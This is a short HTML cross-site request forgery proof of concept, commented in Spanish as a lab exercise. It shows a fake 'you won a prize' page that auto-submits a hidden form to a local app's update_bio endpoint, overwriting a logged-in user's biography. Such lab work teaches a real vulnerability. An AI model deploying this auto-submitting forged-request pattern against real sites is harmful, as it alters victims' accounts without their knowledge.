<!-- Prueba de concepto CSRF (laboratorio). Igual a archivo.html entregado, pero con
     el campo que la aplicacion realmente lee (nueva_bio). Abrirla con la sesion
     iniciada en http://127.0.0.1:5000 en la version original cambia la biografia. -->
<html>
  <body>
    <h1>¡Has ganado un premio!</h1>
    <form id="csrf-form" action="http://127.0.0.1:5000/update_bio" method="POST">
      <input type="hidden" name="nueva_bio" value="ESTA CUENTA FUE HACKEADA" />
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>
